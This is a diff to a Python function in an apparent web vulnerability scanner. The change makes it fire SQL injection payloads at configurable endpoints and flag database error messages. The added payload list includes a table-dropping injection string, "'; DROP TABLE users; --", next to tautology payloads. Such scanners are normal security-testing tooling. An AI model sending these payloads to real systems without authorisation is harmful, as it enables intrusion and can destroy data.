@@ -1,16 +1,53 @@
 from backend.utils.http_client import make_request
-from backend.utils.response_parser import parse_response, format_log
+from backend.utils.response_parser import format_log
 
 def sql_injection_test(base_url, options):
-    payloads = options.get("payloads", ["' OR '1'='1", "' UNION SELECT NULL--"])
+    """
+    Attempt basic SQL injection attacks on given endpoints.
+    """
     logs = []
+    # A minimal set of payloads for demonstration.
+    # Real tests should use more extensive payload lists.
+    payloads = [
+        "' OR '1'='1",
+        "'; DROP TABLE users; --",
+        "\" OR \"1\"=\"1",
+    ]
 
-    for payload in payloads:
-        try:
-            response = make_request(base_url, data={"input": payload})
-            parsed = parse_response(response)
-            logs.append(format_log(f"Tested SQL payload '{payload}'", parsed))
-        except Exception as e:
-            logs.append(format_log(f"Error testing payload '{payload}'", {"error": str(e)}))
+    # Endpoints that accept GET (or possibly POST) parameters
+    endpoints = options.get("endpoints", ["/search"])
+    # Parameter name(s) to inject
+    param_name = options.get("param_name", "q")
 
-    return {"logs": logs, "score": 5}
+    for endpoint in endpoints:
+        for payload in payloads:
+            # Build the full URL with the payload as a GET parameter
+            url_with_payload = f"{base_url}{endpoint}?{param_name}={payload}"
+            try:
+                response = make_request(url_with_payload)
+                # Log the attempt
+                logs.append(format_log(
+                    message=f"SQL Injection attempt on {endpoint}",
+                    details={
+                        "payload": payload,
+                        "status_code": response.status_code
+                    }
+                ))
+                # (Optional) Check for known DB error messages
+                error_markers = ["mysql_fetch", "syntax error", "MySQL", "SQL syntax"]
+                if any(marker.lower() in response.text.lower() for marker in error_markers):
+                    logs.append(format_log(
+                        message="Possible SQL injection vulnerability detected",
+                        details={
+                            "endpoint": endpoint,
+                            "payload": payload
+                        }
+                    ))
+            except Exception as e:
+                logs.append(format_log(
+                    message=f"Error during SQL injection request to {endpoint}",
+                    details={"error": str(e), "payload": payload}
+                ))
+    
+    # Return logs and a hypothetical "severity" score
+    return {"logs": logs, "score": 8}
